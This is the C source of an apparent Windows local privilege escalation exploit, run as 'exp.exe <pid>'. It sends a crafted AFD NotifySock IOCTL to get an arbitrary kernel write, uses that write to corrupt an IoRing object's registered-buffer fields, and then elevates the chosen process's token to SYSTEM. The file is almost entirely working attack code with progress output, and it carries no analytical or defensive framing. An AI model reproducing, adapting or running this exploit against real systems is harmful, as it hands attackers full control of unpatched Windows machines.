#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <ioringapi.h>

#include "win_defs.h"
#include "ioring.h"


#define AFD_NOTIFYSOCK_IOCTL 0x12127

// Good enough™ best guess on what this structure is.
typedef struct AFD_NOTIFYSOCK_DATA
{
    HANDLE hCompletion;
    PVOID pData1;
    PVOID pData2;
    PVOID pPwnPtr;
    DWORD dwCounter;
    DWORD dwTimeout;
    DWORD dwLen;
    char lol[0x4];
}AFD_NOTIFYSOCK_DATA;


int GetNtFunctions(void)
{
    int ret = -1;

    _NtCreateFile = (unsigned long(__stdcall*)(PHANDLE, unsigned long, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, unsigned long, unsigned long, unsigned long, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
    _NtDeviceIoControlFile = (unsigned long(__stdcall*)(HANDLE, void*, void*, void*, PIO_STATUS_BLOCK, unsigned long, void*, unsigned long, void*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDeviceIoControlFile");
    _NtCreateIoCompletion = (unsigned long(__stdcall*)(PHANDLE, unsigned long, POBJECT_ATTRIBUTES, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateIoCompletion");
    _NtSetIoCompletion = (unsigned long(__stdcall*)(HANDLE, unsigned long, PIO_STATUS_BLOCK, NTSTATUS, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetIoCompletion");
    _NtQuerySystemInformation = (unsigned long(__stdcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if ((_NtSetIoCompletion == NULL) || (_NtCreateIoCompletion == NULL) || (_NtCreateFile == NULL) || (_NtDeviceIoControlFile == NULL) || (_NtQuerySystemInformation == NULL))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int ArbitraryKernelWrite0x1(void* pPwnPtr)
{
    int ret = -1;
    HANDLE hCompletion = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    HANDLE hSocket = INVALID_HANDLE_VALUE;
    UNICODE_STRING ObjectFilePath = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    AFD_NOTIFYSOCK_DATA Data = { 0 };
    HANDLE hEvent = NULL;
    HANDLE hThread = NULL;
    
    // Hard-coded attributes for an IPv4 TCP socket
    BYTE bExtendedAttributes[] =
    {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
        0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
    };

    ret = _NtCreateIoCompletion(&hCompletion, MAXIMUM_ALLOWED, NULL, 1);

    if (0 != ret)
    {
        goto done;
    }

    ret = _NtSetIoCompletion(hCompletion, 0x1337, &IoStatusBlock, 0, 0x100);

    if (0 != ret)
    {
        goto done;
    }

    ObjectFilePath.Buffer = (PWSTR)L"\\Device\\Afd\\Endpoint";
    ObjectFilePath.Length = (USHORT)wcslen(ObjectFilePath.Buffer) * sizeof(wchar_t);
    ObjectFilePath.MaximumLength = ObjectFilePath.Length;

    ObjectAttributes.Length = sizeof(ObjectAttributes);
    ObjectAttributes.ObjectName = &ObjectFilePath;
    ObjectAttributes.Attributes = 0x40;

    ret = _NtCreateFile(&hSocket, MAXIMUM_ALLOWED, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));

    if (0 != ret)
    {
        goto done;
    }

    Data.hCompletion = hCompletion;
    Data.pData1 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.pData2 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    Data.dwCounter = 0x1;
    Data.dwLen = 0x1;
    Data.dwTimeout = 100000000;
    Data.pPwnPtr = pPwnPtr;

    if ((NULL == Data.pData1) || (NULL == Data.pData2))
    {
        ret = GetLastError();
        goto done;
    }

    hEvent = CreateEvent(NULL, 0, 0, NULL);
    
    if (NULL == hEvent)
    {
        ret = GetLastError();
        goto done;
    }

    _NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &IoStatusBlock, AFD_NOTIFYSOCK_IOCTL, &Data, 0x30, NULL, 0);

    ret = 0;

done:
    if (INVALID_HANDLE_VALUE != hCompletion)
    {
        CloseHandle(hCompletion);
    }

    if (INVALID_HANDLE_VALUE != hSocket)
    {
        CloseHandle(hSocket);
    }

    if (NULL != hEvent)
    {
        CloseHandle(hEvent);
    }

    if (NULL != Data.pData1)
    {
        VirtualFree(Data.pData1, 0, MEM_RELEASE);
    }

    if (NULL != Data.pData2)
    {
        VirtualFree(Data.pData2, 0, MEM_RELEASE);
    }

    return ret;
}

int main(int argc, char* argv[])
{
    int ret = -1;
    PIORING_OBJECT pIoRing = NULL;
    ULONG pid = 0;

    if (argc != 2)
    {
        printf("usage:\nexp.exe <pid>\n");
        goto done;
    }

    pid = strtol(argv[1], NULL, 10);

    printf("[!] Attempting to elevate pid %i\n", pid);

    ret = GetNtFunctions();

    if (0 != ret)
    {
        printf("[-] Failed to get address of NT functions: %0x\n", ret);
        goto done;
    }

    ret = ioring_setup(&pIoRing);

    if (0 != ret)
    {
        printf("[-] IORING setup failed: %0x\n", ret);
        goto done;
    }

    printf("[+] IoRing Obj Address at %llx\n", pIoRing);

    ret = ArbitraryKernelWrite0x1((char*)&pIoRing->RegBuffers + 0x3);

    if (0 != ret)
    {
        printf("[-] IoRing->RegBuffers overwrite failed: %0x\n", ret);
        goto done;
    }

    printf("[+] IoRing->RegBuffers overwritten with address 0x1000000\n");

    ret = ArbitraryKernelWrite0x1((char*)&pIoRing->RegBuffersCount);

    if (0 != ret)
    {
        printf("[-] IoRing->RegBuffersCount overwrite failed: %0x\n", ret);
        goto done;
    }

    printf("[+] IoRing->RegBuffersCount overwritten with 0x1\n");

    ret = ioring_lpe(pid, 0x1000000, 0x1);

    if (0 != ret)
    {
        printf("[-] LPE Failed: %0x\n", ret);
        goto done;
    }

    printf("[+] Target process token elevated to SYSTEM!\n");

done:
    return ret;
}